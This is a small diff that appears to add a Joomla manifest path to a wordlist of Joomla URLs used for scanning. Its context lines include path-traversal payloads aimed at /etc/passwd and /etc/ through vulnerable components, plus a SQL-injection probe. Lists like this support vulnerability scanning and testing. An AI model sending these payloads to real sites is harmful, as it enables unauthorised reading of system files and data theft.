@@ -55,3 +55,4 @@
 /index.php?option=com_jvehicles&controller=../../../../../../../../../../etc/passwd%00
 /index.php?option=com_oscommerce&osMod=mshop_pl_src&manufacturers_id=7&sort=products_sort_order&page=index.php&format=xml&task=showproducts&view=med&sort=latest&sortdir=%27
 /index.php?option=com_fabrik&task=plugin.pluginAjax&plugin=image&g=element&method=onAjax_files&folder=../../../../../../../../../../../../../../../etc/
+/administrator/manifests/files/joomla.xml
